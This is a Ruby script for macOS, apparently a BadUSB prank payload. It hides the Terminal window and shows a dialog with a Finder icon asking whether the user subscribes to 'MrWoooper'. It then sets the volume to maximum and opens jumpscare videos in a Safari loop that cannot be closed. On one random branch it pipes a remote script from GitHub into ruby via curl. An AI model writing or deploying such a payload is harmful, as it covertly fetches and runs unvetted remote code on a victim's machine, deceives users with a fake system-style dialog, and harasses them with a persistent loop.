#!/usr/bin/env ruby
require 'open-uri'
require 'tempfile'

# --- Hide Terminal Window ---
system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")

# --- Helper Method: Display Dialog with Finder Icon using AppleScript ---
def display_dialog(message, buttons, default)
  button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
  ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
  output = `osascript -e '#{ascript}'`
  if output =~ /button returned:(\S+)/
    return $1
  else
    return nil
  end
end

# --- Volume Control ---
def set_volume_to_max
  if system("command -v osascript > /dev/null 2>&1")
    system("osascript -e 'set volume output volume 100'")
  elsif system("command -v amixer > /dev/null 2>&1")
    system("amixer set Master 100%")
  else
    puts "Volume control not supported on this system."
  end
end

# --- Branch: Run Secret Script ---
def run_secret_script
  system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
end

# --- Branch: Winner Jumpscare ---
def trigger_winner_jumpscare
  set_volume_to_max
  winner_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
  system("open -a Safari '#{winner_url}'")
end

# --- Persistent Jumpscare Loop for Non-Subscribers ---
# This loop uses AppleScript to check if Safari has a tab containing the target URL.
def persistent_jumpscare(target_url)
  # Initially open Safari with the target URL.
  set_volume_to_max
  system("open -a Safari '#{target_url}'")
  
  loop do
    sleep 3
    apple_script_check = %Q(
tell application "Safari"
  set found to false
  repeat with w in windows
    repeat with t in tabs of w
      if (URL of t) contains "jumpscare2.mp4" then
        set found to true
      end if
    end repeat
  end repeat
  if found is false then
    open location "#{target_url}"
  end if
end tell)
    system("osascript -e '#{apple_script_check}'")
  end
end

# --- Main Program Flow ---

# First prompt: "Are you subscribed to MrWoooper?"
response = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")

if response.nil?
  puts "No response received. Exiting."
  exit 0
end

if response.downcase == "no"
  # Non-subscriber branch: immediately play the jumpscare video.
  # Use the raw link for jumpscare2.mp4.
  jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
  persistent_jumpscare(jumpscare_video_url)
else
  # Subscriber branch: prompt for button selection.
  button_message = "Choose a button: (You have a 50% chance of something good happening to you)"
  button_choice = display_dialog(button_message, ["Button A", "Button B"], "Button A")
  if button_choice.nil?
    puts "No button chosen. Exiting."
    exit 0
  end
  # Random outcome 50/50:
  if rand < 0.5
    run_secret_script
  else
    # Show "You won!" dialog and then trigger winner jumpscare.
    `osascript -e 'display dialog "You won!" buttons {"OK"} default button "OK" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"'`
    trigger_winner_jumpscare
  end
end
